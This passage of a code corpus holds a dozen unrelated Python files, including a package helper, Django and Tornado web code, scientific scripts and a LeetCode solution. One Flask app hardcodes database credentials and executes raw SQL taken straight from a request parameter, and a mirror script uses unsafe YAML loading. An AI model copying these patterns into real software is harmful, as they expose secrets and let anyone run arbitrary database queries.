packages[pkg.PN].sort(key=cmp_to_key(vercmp))\n        return packages\n\n    def list(self):\n        packages = {}\n        for category in self._categories:\n            packages[category] = {}\n        for pkg in self:\n            if pkg.PN not in packages[pkg.CAT]:\n                packages[pkg.CAT][pkg.PN] = []\n            packages[pkg.CAT][pkg.PN].append(pkg.PV)\n            packages[pkg.CAT][pkg.PN].sort(key=cmp_to_key(vercmp))\n        return packages\n\n    def get(self, p):\n        for pkg in self:\n            if pkg.P == p:\n                return pkg\n        return None\n"}
{"text": "# encoding=utf-8\nimport tornado.web\n\nfrom terroroftinytown.tracker.model import User\n\n\nACCOUNT_COOKIE_NAME = 'tottu'\nACCOUNT_TOKEN_COOKIE_NAME = 'tottt'\n\n\nclass BaseHandler(tornado.web.RequestHandler):\n    def get_current_user(self):\n        username_raw = self.get_secure_cookie(ACCOUNT_COOKIE_NAME)\n        token = self.get_secure_cookie(ACCOUNT_TOKEN_COOKIE_NAME)\n\n        if username_raw and token:\n            username = username_raw.decode('ascii')\n\n            if username and User.check_account_session(username, token):\n                return username\n\n    def prepare(self):\n        if self.application.is_maintenance_in_progress():\n            self._show_maintenance_page()\n\n    def _show_maintenance_page(self):\n        self.set_status(512, 'EXPORTING OUR SHIT')\n        self.render('maintenance.html')\n        raise tornado.web.Finish()\n\n    def user_audit_text(self, text):\n        return '[{username} - {ip_address}] {text}'.format(\n            username=self.current_user,\n            ip_address=self.request.remote_ip,\n            text=text,\n        )\n"}
{"text": "# -*- coding: utf-8 -*-\n# This file is part of Shuup.\n#\n# Copyright (c) 2012-2016, Shoop Commerce Ltd. All rights reserved.\n#\n# This source code is licensed under the AGPLv3 license found in the\n# LICENSE file in the root directory of this source tree.\nfrom __future__ import unicode_literals\n\nimport enumfields\nfrom django import forms\nfrom django.apps import apps\nfrom django.core.exceptions import ObjectDoesNotExist\nfrom django.utils.text import camel_case_to_spaces\nfrom django.utils.translation import ugettext_lazy as _\n\n\nclass Type(object):\n    name = None\n    identifier = None\n\n    def get_field(self, **kwargs):\n        \"\"\"\n        Get a Django form field for this type.\n\n        The kwargs are passed directly to the field\n        constructor.\n\n        :param kwargs: Kwargs for field constructor\n        :type kwargs: dict\n        :return: Form field\n        :rtype: django.forms.Field\n        \"\"\"\n        return forms.CharField(**kwargs)\n\n    def unserialize(self, value):\n        return self.get_field().to_python(value)\n\n    def validate(self, value):\n        return self.get_field().validate(value)\n\n    def is_coercible_from(self, other_type):\n        return self.identifier == other_type.identifier\n\n\nclass _String(Type):\n    pass\n\n\nclass _Number(Type):\n    pass\n\n\nclass Boolean(Type):\n    name = _(\"Boolean\")\n    identifier = \"boolean\"\n\n\nclass Integer(_Number):\n    name = _(\"Integer Number\")\n    identifier = \"integer\"\n\n    def get_field(self, **kwargs):\n        return forms.IntegerField(**kwargs)\n\n\nclass Decimal(_Number):\n    name = _(\"Decimal Number\")\n    identifier = \"decimal\"\n\n    def get_field(self, **kwargs):\n        return forms.DecimalField(**kwargs)\n\n\nclass Text(_String):\n    name = _(\"Text\")\n    identifier = \"text\"\n\n    def is_coercible_from(self, other_type):\n        # All variables can be used as raw text\n        return True\n\n\nclass Language(_String):\n    name = _(\"Language\")\n    identifier = \"language\"\n\n\nclass Email(_String):\n    name = _(\"Email Address\")\n    identifier = \"email\"\n\n    def get_field(self, **kwargs):\n        return forms.EmailField(**kwargs)\n\n\nclass URL(_String):\n    name = _(\"URL Address\")\n    identifier = \"url\"\n\n    def get_field(self, **kwargs):\n        return forms.URLField(**kwargs)\n\n\nclass Phone(_String):\n    name = _(\"Phone Number\")\n    identifier = \"phone\"\n\n\nclass Model(Type):\n    model_label = None\n    identifier = \"model\"\n\n    @property\n    def name(self):\n        return self.get_model()._meta.verbose_name\n\n    def __init__(self, model_label):\n        \"\"\"\n        :param model_label: Model label in Django `app.Model` format (e.g. `shuup.Order`)\n        :type model_label: str\n        \"\"\"\n        self.model_label = model_label\n\n    def unserialize(self, value):\n        if isinstance(value, self.get_model()):\n            return value\n\n        try:\n            return self.get_model().objects.get(pk=value)\n        except ObjectDoesNotExist:\n            return None\n\n    def is_coercible_from(self, other_type):\n        return isinstance(other_type, Model) and self.get_model() == other_type.get_model()\n\n    def get_model(self):\n        \"\"\"\n        :rtype: django.db.models.Model\n        \"\"\"\n        return apps.get_model(self.model_label)\n\n    def get_field(self, **kwargs):\n        kwargs.setdefault(\"queryset\", self.get_model().objects.all())\n        return forms.ModelChoiceField(**kwargs)\n\n\nclass Enum(Type):\n    enum_class = None\n    identifier = \"enum\"\n\n    @property\n    def name(self):\n        if self.enum_class:\n            return camel_case_to_spaces(self.enum_class.__class__.__name__)\n        return u\"<Invalid Enum>\"\n\n    def __init__(self, enum_class):\n        self.enum_class = enum_class\n        assert issubclass(enum_class, enumfields.Enum), \"%r is not an enum\" % enum_class\n\n    def unserialize(self, value):\n        if isinstance(value, self.enum_class):\n            return value\n\n        try:\n            return self.enum_class(value)\n        except ValueError:\n            try:\n                return self.enum_class(int(value))\n            except ValueError:\n                pass\n        return None\n\n    def get_field(self, **kwargs):\n        return enumfields.EnumField(self.enum_class).formfield(**kwargs)\n"}
{"text": "#!/usr/bin/env python3\n\nimport logging\nimport lxc\nimport os\nimport tunneldigger\n\n# random hash\nCONTEXT = None\n\n# lxc container\nSERVER = None\nCLIENT = None\n\n# pids of tunneldigger client and server\nSERVER_PID = None\nCLIENT_PID = None\n\nLOG = logging.getLogger(\"test_nose\")\n\ndef setup_module():\n    global CONTEXT, SERVER, CLIENT, SERVER_PID, CLIENT_PID\n    CONTEXT = tunneldigger.get_random_context()\n    LOG.info(\"using context %s\", CONTEXT)\n    CLIENT, SERVER = tunneldigger.prepare_containers(CONTEXT, os.environ['CLIENT_REV'], os.environ['SERVER_REV'])\n    SERVER_PID = tunneldigger.run_server(SERVER)\n    CLIENT_PID = tunneldigger.run_client(CLIENT)\n    # explicit no Exception when ping fails\n    # it's better to poll the client for a ping rather doing a long sleep\n    tunneldigger.check_ping(CLIENT, '192.168.254.1', 20)\n\ndef teardown_module():\n    tunneldigger.clean_up(CONTEXT, CLIENT, SERVER)\n\nclass TestTunneldigger(object):\n    def test_ping_tunneldigger_server(self):\n        \"\"\" even we check earlier if the ping is working, we want to fail the check here.\n        If we fail in setup_module, nose will return UNKNOWN state, because the setup fails and\n        not a \"test\" \"\"\"\n        if not tunneldigger.check_ping(CLIENT, '192.168.254.1', 3):\n            raise RuntimeError(\"fail to ping server\")\n\n    def test_wget_tunneldigger_server(self):\n        ret = CLIENT.attach_wait(lxc.attach_run_command, [\"wget\", \"-t\", \"2\", \"-T\", \"4\", \"http://192.168.254.1:8080/test_8m\", '-O', '/dev/null'])\n        if ret != 0:\n            raise RuntimeError(\"failed to run the tests\")\n\n    def test_ensure_tunnel_up_for_5m(self):\n        # get id of l2tp0 iface\n        ## ip -o l | awk -F: '{ print $1 }'\n        # sleep 5 minutes\n        # get id of l2tp0 iface\n        ## ip -o l | awk -F: '{ print $1 }'\n        # assert early_id == later_id\n        pass\n"}
{"text": "# -*- coding: utf-8 -*-\n\"\"\"\nCreated on Wed Feb 17 18:15:40 2016\n\n@author: Radu\n\"\"\"\nimport struct\nfrom neuron import h\n\ndef get_net_params(tempdata_address):\n\n    text_file_location = tempdata_address + \"cell_params\"\n    result = []\n    text_file = open(text_file_location, 'rb')\n\n    value = text_file.read(8)\n    while value:\n        result.append(struct.unpack(\"d\",value))\n        value = text_file.read(8)\n    #print result\n    #print len(result)\n    text_file.close()\n    return result\n\ndef get_tempdata_address(double_escaped = 0):\n    h('systype = unix_mac_pc()')\n\n    if h.systype == 3:\n        if double_escaped:\n            tempdata_address = '..\\\\\\\\..\\\\\\\\tempdata\\\\\\\\'\n        else:\n            tempdata_address = '..\\\\..\\\\tempdata\\\\'\n    else:\n        tempdata_address = \"../tempdata/\"\n\n    return tempdata_address\n\ndef get_mn_geom_address(double_escaped = 0):\n    h('systype = unix_mac_pc()')\n\n    if h.systype == 3:\n        if double_escaped:\n            mn_geom_address = '..\\\\\\\\mn_geometries\\\\\\\\'\n        else:\n            mn_geom_address = '..\\\\mn_geometries\\\\'\n    else:\n        mn_geom_address = \"mn_geometries/\"\n\n    return mn_geom_address\n\ndef get_comsol_voltage(tempdata_address):\n\n    text_file_location = tempdata_address + \"matlab_v_extra\"\n    result = []\n    text_file = open(text_file_location, 'rb')\n\n    value = text_file.read(8)\n    while value:\n        result.append(struct.unpack(\"d\",value))\n        value = text_file.read(8)\n    text_file.close()\n    return result\n"}
{"text": "from flask.ext.mysql import MySQL\nfrom flask import Flask, request, session, g, redirect, url_for, abort, render_template, flash, jsonify\nfrom contextlib import closing\n\n# configuration\nDEBUG = True\n\n# variables for database access\nHOST = 'sql3.freemysqlhosting.net'\nUSER = 'sql3114361'\nPASSWD = 'zZl9FPvPV9'\nDATABASE = 'sql3114361'\n\n# create application\napp = Flask(__name__)\nmysql = MySQL()\n\napp.config.from_object(__name__)\napp.config['MYSQL_DATABASE_HOST'] = HOST\napp.config['MYSQL_DATABASE_USER'] = USER\napp.config['MYSQL_DATABASE_PASSWORD'] = PASSWD\napp.config['MYSQL_DATABASE_DB'] = DATABASE\nmysql.init_app(app)\n\ndef connect_db():\n    return mysql.connect()\n\n@app.before_request\ndef before_request():\n    g.db = connect_db()\n\n@app.teardown_request\ndef teardown_request(exception):\n    db = getattr(g, 'db', None)\n    if db is not None:\n        db.close()\n\n#Custom query\n@app.route('/getData', methods=['GET'])\ndef getData():\n\n    result = None\n\n    cursor = g.db.cursor()\n\n    #get all interesting queries in one shot, divide them up later\n    query=request.args.get('query')\n\n    cursor.execute(query)\n\n    # Get column headers\n    result = [[word[0] for word in cursor.description]]\n\n    #get data\n    queryRows = cursor.fetchall()\n    for row in queryRows:\n        result.append(row)\n        \n    return jsonify(result=result)\n\n@app.route('/')\ndef mainPg():\n    return render_template('customQuery.html')\n\nif __name__ == '__main__':\n    app.run()\n"}
{"text": "\n# coding: utf-8\n\n# # Publications markdown generator for academicpages\n# \n# Takes a TSV of publications with metadata and converts them for use with [academicpages.github.io](academicpages.github.io). This is an interactive Jupyter notebook, with the core python code in publications.py. Run either from the `markdown_generator` folder after replacing `publications.tsv` with one that fits your format.\n# \n# TODO: Make this work with BibTex and other databases of citations, rather than Stuart's non-standard TSV format and citation style.\n# \n\n# ## Data format\n# \n# The TSV needs to have the following columns: pub_date, title, venue, excerpt, citation, site_url, and paper_url, with a header at the top. \n# \n# - `excerpt` and `paper_url` can be blank, but the others must have values. \n# - `pub_date` must be formatted as YYYY-MM-DD.\n# - `url_slug` will be the descriptive part of the .md file and the permalink URL for the page about the paper. The .md file will be `YYYY-MM-DD-[url_slug].md` and the permalink will be `https://[yourdomain]/publications/YYYY-MM-DD-[url_slug]`\n\n\n# ## Import pandas\n# \n# We are using the very handy pandas library for dataframes.\n\n# In[2]:\n\nimport pandas as pd\n\n\n# ## Import TSV\n# \n# Pandas makes this easy with the read_csv function. We are using a TSV, so we specify the separator as a tab, or `\\t`.\n# \n# I found it important to put this data in a tab-separated values format, because there are a lot of commas in this kind of data and comma-separated values can get messed up. However, you can modify the import statement, as pandas also has read_excel(), read_json(), and others.\n\n# In[3]:\n\nprofessional = pd.read_csv(\"professional.tsv\", sep=\"\\t\", header=0)\nprofessional\n\n\n# ## Escape special characters\n# \n# YAML is very picky about how it takes a valid string, so we are replacing single and double quotes (and ampersands) with their HTML encoded equivilents. This makes them look not so readable in raw format, but they are parsed and rendered nicely.\n\n# In[4]:\n\nhtml_escape_table = {\n    \"&\": \"&amp;\",\n    '\"': \"&quot;\",\n    \"'\": \"&apos;\"\n    }\n\ndef html_escape(text):\n    \"\"\"Produce entities within text.\"\"\"\n    return \"\".join(html_escape_table.get(c,c) for c in text)\n\n\n# ## Creating the markdown files\n# \n# This is where the heavy lifting is done. This loops through all the rows in the TSV dataframe, then starts to concatentate a big string (```md```) that contains the markdown for each type. It does the YAML metadata first, then does the description for the individual page. If you don't want something to appear (like the \"Recommended citation\")\n\n# In[5]:\n\nimport os\n\nSPACE = ' '\nSTAR = '*'\nTAB = SPACE + SPACE\nTAB_BULLET = SPACE + STAR + SPACE\nENDL = '\\n'\nWIP = '*[ WIP ]*'\nTODO = '*[TODO]*'\n\ndef is_not_NaN(num):\n    return num == num\n\ndef is_not_empty(s):\n    return is_not_NaN(s) and len(str(s)) > 0\n\ndef bold(s):\n    return STAR + STAR + str(s) + STAR + STAR\n\ndef italicize(s):\n    return STAR + str(s) + STAR\n\ndef coursera_icon_link(s):\n    return '<a href=\"' + str(s) + '\" target=\"_blank\"><i class=\"ai ai-courser\"></i></a>'\n\ndef github_icon_link(s):\n    return '<a href=\"' + str(s) + '\" target=\"_blank\"><i class=\"fa fa-github\" aria-hidden=\"true\"></i> </a>'\n\ndef certificate_icon_link(s):\n    return '<a href=\"' + str(s) + '\" target=\"_blank\"><i class=\"fa fa-certificate\" aria-hidden=\"true\"></i> </a>'\n\nwith open(\"../_pages/professional.md\", 'w') as f:\n    for row, item in professional.iterrows():\n        md = ''\n        md += TAB_BULLET\n        md += str(item.course_name)\n        md += SPACE\n        md += \"by \"\n        md += '[' + str(item.provider) + '](' + str(item.provider_url) + ')'\n        md += SPACE\n        if is_not_empty(item.certificate_link):\n            md += certificate_icon_link(item.certificate_link)\n        md += ENDL\n        \n        f.write(md)\n"}
{"text": "# -*- coding: utf-8 -*-\n\"\"\"Model to record combatants' acceptance of the privacy policy.\"\"\"\n\n# standard library imports\n# pylint complains about the uuid import but it is used for Required(uuid.UUID)\n# pylint: disable=unused-import\nimport uuid\nfrom datetime import datetime\n\n# third-party imports\nfrom flask import url_for, current_app as app\n\n# application imports\nfrom emol.mail import Emailer\nfrom emol.utility.database import default_uuid\n\n__all__ = ['PrivacyAcceptance']\n\n\nclass PrivacyAcceptance(app.db.Model):\n    \"\"\"Record indicating acceptance of the privacy policy.\n\n    When a Combatant record is inserted into the database, the listener\n    event creates a matching PrivacyAccepted record. Any combatant who has\n    a PrivacyAccepted record that is not resolved cannot use the system\n    until they accept the privacy policy\n\n    When the combatant accepts the privacy policy, the PrivacyAccepted record\n    is resolved by noting the datetime that the privacy policy was accepted\n\n    If the combatant declines the privacy policy, the Combatant record and the\n    related PrivacyAcceptance is deleted from the database and the MoL is\n    informed\n\n    Attributes:\n        id: Identity PK for the table\n        uuid: A reference to the record with no intrinsic meaning\n        accepted: Date the combatant accepted the privacy policy\n        combatant_id: ID of the related combatant\n        combatant: ORM relationship to the Combatant identified by combatant_id\n\n    \"\"\"\n    id = app.db.Column(app.db.Integer, primary_key=True)\n\n    combatant_id = app.db.Column(app.db.Integer, app.db.ForeignKey('combatant.id'))\n    combatant = app.db.relationship(\n        'Combatant',\n        backref=app.db.backref('privacy_acceptance', uselist=False, cascade=\"all, delete-orphan\")\n    )\n\n    uuid = app.db.Column(app.db.String(36), default=default_uuid)\n    accepted = app.db.Column(app.db.DateTime)\n\n    @classmethod\n    def create(cls, combatant, no_email=False):\n        \"\"\"Generate a PrivacyAccepted record for a combatant.\n\n        Generates and saves the PrivacyAccepted record, then sends out the\n        email to prompt the combatant to visit eMoL and read (heh) and accept\n         the privacy policy\n\n        Attributes:\n            combatant: A combatant\n            no_email: Should be used for unit testing only\n\n        \"\"\"\n        privacy_acceptance = cls(combatant=combatant)\n        app.db.session.add(privacy_acceptance)\n        app.db.session.commit()\n\n        emailer = Emailer()\n        emailer.send_privacy_policy_acceptance(privacy_acceptance)\n\n    @property\n    def privacy_policy_url(self):\n        \"\"\"Generate the URL for a user to visit to accept the privacy policy.\n\n        Uses the uuid member to uniquely identify this privacy accepted record,\n        and through it the combatant.\n\n        Returns:\n            String containing the URL\n\n        \"\"\"\n        return url_for('privacy_policy.index', uuid=self.uuid, _external=True)\n\n    def resolve(self, accepted):\n        if accepted is True:\n            # Combatant accepted the privacy policy. Note the time of\n            # acceptance, generate their card_id and email them the\n            # link to their card\n            self.accepted = datetime.utcnow()\n            self.combatant.generate_card_id()\n            emailer = Emailer()\n            emailer.send_card_request(self.combatant)\n            app.logger.debug('Sent card request email to {0}'.format(\n                self.combatant.email\n            ))\n\n            has_sca_name = self.combatant.sca_name is not None\n\n            return {\n                'accepted': True,\n                'card_url': self.combatant.card_url,\n                'has_sca_name': has_sca_name\n            }\n        else:\n            # Combatant declined the privacy policy, delete the Combatant\n            # record for them and notify the MoL\n            combatant = self.combatant\n            app.db.session.delete(self)\n            app.db.session.delete(combatant)\n            app.logger.info('Deleted combatant {0}'.format(\n                self.combatant.email))\n            # TODO: Notify the MoL\n            app.db.session.commit()\n\n            return {'accepted': False}\n"}
{"text": "from django.contrib.auth.decorators import login_required\nfrom django.conf.urls import url\nfrom django.views.generic import TemplateView\nfrom . import views\n\nurlpatterns = [\n   url(r'^$', login_required(views.IdeaListView.as_view()), name=\"idealist\"),\n\n   # Idea\n   url(r'idea/(?P<pk>[0-9]+)/$', login_required(views.IdeaDetailView.as_view()), name=\"ideadetail\"),\n   url(r'idea/add/$', login_required(views.CreateIdeaView.as_view()), name=\"addidea\"),\n   url(r'^idea/(?P<pk>[0-9]+)/update/$', login_required(views.UpdateIdeaView.as_view()), name=\"ideaupdate\"),\n   url(r'^idea/(?P<pk>[0-9]+)/delete/$', login_required(views.DeleteIdeaView.as_view()), name=\"deleteidea\"),\n   url(r'^idea/delete/success/$', login_required(TemplateView.as_view(template_name=\"suggestionApp/success.html\")), name=\"deleteideasuccess\"),\n\n   # Category\n   url(r'category/(?P<pk>[0-9]+)/$', login_required(views.CategoryDetailView.as_view()), name=\"categorydetail\"),\n   url(r'category/add/$', login_required(views.CreateCategoryView.as_view()), name=\"addcategory\"),\n   url(r'^category/(?P<pk>[0-9]+)/update/$', login_required(views.UpdateCategoryView.as_view()), name=\"categoryupdate\"),\n   url(r'^category/(?P<pk>[0-9]+)/delete/$', login_required(views.DeleteCategoryView.as_view()), name=\"deletecategory\"),\n   url(r'^category/delete/success/$', login_required(TemplateView.as_view(template_name=\"suggestionApp/success.html\")), name=\"deletecategorysuccess\"),\n\n   # Comment\n   url(r'^(?P<idea_id>[0-9]+)/comment/$', views.comment, name='comment'),\n   url(r'^(?P<pk>[0-9]+)/commented/$', views.IdeaDetailView.as_view(), name='commented'),\n]"}
{"text": "\"\"\"\n====================================================\nComparison of segmentation and superpixel algorithms\n====================================================\n\nThis example compares three popular low-level image segmentation methods.  As\nit is difficult to obtain good segmentations, and the definition of \"good\"\noften depends on the application, these methods are usually used for obtaining\nan oversegmentation, also known as superpixels. These superpixels then serve as\na basis for more sophisticated algorithms such as conditional random fields\n(CRF).\n\n\nFelzenszwalb's efficient graph based segmentation\n-------------------------------------------------\nThis fast 2D image segmentation algorithm, proposed in [1]_ is popular in the\ncomputer vision community.\nThe algorithm has a single ``scale`` parameter that influences the segment\nsize. The actual size and number of segments can vary greatly, depending on\nlocal contrast.\n\n.. [1] Efficient graph-based image segmentation, Felzenszwalb, P.F. and\n       Huttenlocher, D.P.  International Journal of Computer Vision, 2004\n\n\nQuickshift image segmentation\n-----------------------------\n\nQuickshift is a relatively recent 2D image segmentation algorithm, based on an\napproximation of kernelized mean-shift. Therefore it belongs to the family of\nlocal mode-seeking algorithms and is applied to the 5D space consisting of\ncolor information and image location [2]_.\n\nOne of the benefits of quickshift is that it actually computes a\nhierarchical segmentation on multiple scales simultaneously.\n\nQuickshift has two main parameters: ``sigma`` controls the scale of the local\ndensity approximation, ``max_dist`` selects a level in the hierarchical\nsegmentation that is produced. There is also a trade-off between distance in\ncolor-space and distance in image-space, given by ``ratio``.\n\n.. [2] Quick shift and kernel methods for mode seeking,\n       Vedaldi, A. and Soatto, S.\n       European Conference on Computer Vision, 2008\n\n\nSLIC - K-Means based image segmentation\n---------------------------------------\nThis algorithm simply performs K-means in the 5d space of color information\nand image location and is therefore closely related to quickshift. As the\nclustering method is simpler, it is very efficient. It is essential for this\nalgorithm to work in Lab color space to obtain good results.  The algorithm\nquickly gained momentum and is now widely used. See [3] for details.  The\n``compactness`` parameter trades off color-similarity and proximity, as in the case\nof Quickshift, while ``n_segments`` chooses the number of centers for kmeans.\n\n.. [3] Radhakrishna Achanta, Appu Shaji, Kevin Smith, Aurelien Lucchi,\n    Pascal Fua, and Sabine Suesstrunk, SLIC Superpixels Compared to\n    State-of-the-art Superpixel Methods, TPAMI, May 2012.\n\"\"\"\nfrom __future__ import print_function\n\nimport matplotlib.pyplot as plt\nimport numpy as np\n\nfrom skimage.data import lena\nfrom skimage.segmentation import felzenszwalb, slic, quickshift\nfrom skimage.segmentation import mark_boundaries\nfrom skimage.util import img_as_float\n\nimg = img_as_float(lena()[::2, ::2])\nsegments_fz = felzenszwalb(img, scale=100, sigma=0.5, min_size=50)\nsegments_slic = slic(img, n_segments=250, compactness=10, sigma=1)\nsegments_quick = quickshift(img, kernel_size=3, max_dist=6, ratio=0.5)\n\nprint(\"Felzenszwalb's number of segments: %d\" % len(np.unique(segments_fz)))\nprint(\"Slic number of segments: %d\" % len(np.unique(segments_slic)))\nprint(\"Quickshift number of segments: %d\" % len(np.unique(segments_quick)))\n\nfig, ax = plt.subplots(1, 3)\nfig.set_size_inches(8, 3, forward=True)\nfig.subplots_adjust(0.05, 0.05, 0.95, 0.95, 0.05, 0.05)\n\nax[0].imshow(mark_boundaries(img, segments_fz))\nax[0].set_title(\"Felzenszwalbs's method\")\nax[1].imshow(mark_boundaries(img, segments_slic))\nax[1].set_title(\"SLIC\")\nax[2].imshow(mark_boundaries(img, segments_quick))\nax[2].set_title(\"Quickshift\")\nfor a in ax:\n    a.set_xticks(())\n    a.set_yticks(())\nplt.show()\n"}
{"text": "from __future__ import print_function\nimport yaml\nimport os\nfrom apt_package_mirror.mirror import Mirror\nimport sys\nimport argparse\n\n\ndef main():\n    # When files are created make them with a 022 umask\n    os.umask(022)\n\n    # Add commandline options and help text for them\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-U', '--update-packages-only',\n                        dest='update_packages_only', action='store_true',\n                        default=False, help='Grab new packages only')\n\n    config_file_help = ('yaml config file that describes what mirror to copy '\n                        'and where to store the data')\n    parser.add_argument(\n            'config_file',  default='config.yaml', nargs='?',\n            help=config_file_help\n        )\n\n    args = parser.parse_args()\n\n    # Check if the config file exists, if it doesnt fail with a message\n    try:\n        with open(args.config_file, \"r\") as file_stream:\n            config = yaml.load(file_stream)\n\n    except:\n        print(\"failed to load the config file\")\n        sys.exit(1)\n\n    # Check if the mirror path defined in the config file exists\n    mirror_path = config['mirror_path']\n\n    if not os.path.exists(mirror_path):\n        print(\"Mirror path does not exist, please fix it\")\n        sys.exit(1)\n\n    # Check if the directory for temp files is defined\n    try:\n        temp_indices = config['temp_files_path']\n    except:\n        temp_indices = None\n\n    # Check if a log_level is defined\n    try:\n        log_level = config['log_level']\n    except:\n        log_level = None\n\n    # Check if a package_ttl is defined\n    try:\n        package_ttl = config['package_ttl']\n    except:\n        package_ttl = None\n\n    # Check if a hash_function is defined\n    try:\n        hash_function = config['hash_function']\n    except:\n        hash_function = None\n\n    # Create a file for logging in the location defined by the config file\n    try:\n        log_file = config['log_file']\n        f = open(log_file, 'a')\n        f.close()\n    except:\n        log_file = None\n\n    mirror = Mirror(mirror_path=mirror_path,\n                    mirror_url=config['mirror_url'],\n                    temp_indices=temp_indices,\n                    log_file=log_file, log_level=log_level,\n                    package_ttl=package_ttl, hash_function=hash_function)\n\n    # If a -U option is used, only update the 'pool' directory. This only grabs\n    # new packages\n    if args.update_packages_only:\n        mirror.update_pool()\n\n    # If a -U option is not used, attempt to update the whole mirror\n    else:\n        mirror.sync()\n\nif __name__ == '__main__':\n    main()\n"}
{"text": "\"\"\"\nPrints all wikis to stdout.\n\nUsage:\n    determine_wikis (-h|--help)\n    determine_wikis [--debug]\n                    [--verbose]\n\n\nOptions:\n    -h, --help                     This help message is printed\n    --debug                        Print debug logging to stderr\n    --verbose                      Print dots and stuff to stderr      \n\"\"\"\n\nimport logging\nimport mwapi\nimport sys\nimport json\n\n\nimport docopt\n\n\n\nlogger = logging.getLogger(__name__)\n\n\n\ndef main(argv=None):\n    args = docopt.docopt(__doc__, argv=argv)\n    logging.basicConfig(\n        level=logging.WARNING if not args['--debug'] else logging.DEBUG,\n        format='%(asctime)s %(levelname)s:%(name)s -- %(message)s'\n    )\n\n    verbose = args['--verbose']\n    run(verbose)\n\n# Contacts API to return list of wikis\n# Code credit: https://github.com/WikiEducationFoundation/academic_classification/blob/master/pageclassifier/revgather.py\ndef run(verbose):\n\n    session = mwapi.Session(\n        'https://en.wikipedia.org',\n        user_agent='hall1467'\n    )\n    results = session.get(\n        action='sitematrix'\n    )\n\n    for database_dictionary in extract_query_results(results):\n\n        if verbose:\n            sys.stderr.write(\"Printing json for the database: \" +\n                database_dictionary['dbname'] + \"\\n\")\n            sys.stderr.flush()\n\n        sys.stdout.write(json.dumps(database_dictionary) + \"\\n\")\n\n\n# Code credit: https://github.com/WikiEducationFoundation/academic_classification/blob/master/pageclassifier/revgather.py\ndef extract_query_results(results):\n    results = results['sitematrix']\n    for entry in results:\n        if entry == 'count':\n            continue\n        if entry == 'specials':\n            for special_entry in results[entry]:\n                yield ({\n                            \"dbname\" : special_entry['dbname'],\n                            \"wikiurl\" : special_entry['url']\n                       })\n            continue\n        for wiki in results[entry]['site']:\n            yield {\n                      \"dbname\" : wiki['dbname'],\n                      \"wikiurl\" : wiki['url']\n                  }\n\n"}
{"text": "#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\n# =============================================================================\n# 2013+ Copyright (c) Kirill Smorodinnikov <shaitkir@gmail.com>\n# All rights reserved.\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n# =============================================================================\n\nimport sys\nsys.path.append('bindings/python/')\nimport elliptics\n\nimport argparse\n\n\ndef percentage(routes):\n    from operator import itemgetter\n    percentages = routes.percentages()\n    for group in percentages:\n        print 'Group {0}:'.format(group)\n        for host in percentages[group]:\n            for backend_id in percentages[group][host]:\n                print '\\thost {0}/{1}\\t{2:.2f}'.format(host, backend_id, percentages[group][host][backend_id])\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description='Get remote route table and print its statistics.')\n    parser.add_argument('remotes', metavar='N', type=str, nargs='+',\n        help='Remote nodes to connect and grab route tables. Format: addr:port:family, where family = 2 for ipv4 and 10 for ipv6')\n    parser.add_argument('--percentage', dest='percentage', action='store_true',\n        help='if present, dump parts of DHT ring each node occupies (in percents)')\n    parser.add_argument('--log', default='/dev/stdout', help='log file')\n    parser.add_argument('--log-level', type=int, default=elliptics.log_level.error,\n        help='log level: %d-%d' % (elliptics.log_level.error, elliptics.log_level.debug))\n\n    args = parser.parse_args()\n    if len(args.remotes) == 0:\n        args.remotes = \"localhost:1025:2\"\n\n    log = elliptics.Logger(args.log, args.log_level)\n    n = elliptics.Node(log)\n    s = elliptics.Session(n)\n\n    try:\n        n.add_remotes(args.remotes)\n    except Exception as e:\n        print e\n        pass\n\n    routes = s.get_routes()\n    if args.percentage:\n        percentage(routes)\n    else:\n        print routes\n"}
{"text": "__source__ = 'https://leetcode.com/problems/numbers-with-same-consecutive-differences/'\n# Time:  O(2^N)\n# Space: O(2^N)\n#\n# Description: Leetcode # 967. Numbers With Same Consecutive Differences\n#\n# Return all non-negative integers of length N such that\n# the absolute difference between every two consecutive digits is K.\n#\n# Note that every number in the answer must not have leading zeros except for the number 0 itself.\n# For example, 01 has one leading zero and is invalid, but 0 is valid.\n#\n# You may return the answer in any order.\n#\n# Example 1:\n#\n# Input: N = 3, K = 7\n# Output: [181,292,707,818,929]\n# Explanation: Note that 070 is not a valid number, because it has leading zeroes.\n#\n# Example 2:\n#\n# Input: N = 2, K = 1\n# Output: [10,12,21,23,32,34,43,45,54,56,65,67,76,78,87,89,98]\n#\n# Note:\n#     1 <= N <= 9\n#     0 <= K <= 9\n#\nimport unittest\n# 76ms 25.71%\nclass Solution(object):\n    def numsSameConsecDiff(self, N, K):\n        \"\"\"\n        :type N: int\n        :type K: int\n        :rtype: List[int]\n        \"\"\"\n        ans = {x for x in range(1, 10)}\n        for _ in xrange(N-1):\n            ans2 = set()\n            for x in ans:\n                d = x % 10\n                if d - K >= 0:\n                    ans2.add(10*x + d-K)\n                if d + K <= 9:\n                    ans2.add(10*x + d+K)\n            ans = ans2\n\n        if N == 1:\n            ans.add(0)\n\n        return list(ans)\nclass TestMethods(unittest.TestCase):\n    def test_Local(self):\n        self.assertEqual(1, 1)\n\n\nif __name__ == '__main__':\n    unittest.main()\n\nJava = '''\n# Thought: https://leetcode.com/problems/numbers-with-same-consecutive-differences/solution/\n#\nApproach 1: Brute Force\nComplexity Analysis\nTime Complexity: O(2^N)\nSpace Complexity: O(2^N) \n# 14ms 44.79%\nclass Solution {\n    public int[] numsSameConsecDiff(int N, int K) {\n        Set<Integer> cur = new HashSet();\n        for (int i = 1; i <= 9; ++i) cur.add(i);\n        for (int steps = 1; steps <= N-1; ++steps) {\n            Set<Integer> cur2 = new HashSet();\n            for (int x: cur) {\n                int d = x % 10;\n                if (d - K >= 0)\n                    cur2.add(10 * x + (d - K));\n                if (d + K <= 9)\n                    cur2.add(10 * x + (d + K));\n            }\n            cur = cur2;\n        }\n\n        if (N == 1)\n            cur.add(0);\n\n        int[] ans = new int[cur.size()];\n        int t = 0;\n        for (int x: cur)\n            ans[t++] = x;\n        return ans;\n    }\n}\n\n# 8ms 93.55%\nclass Solution {\n    public int[] 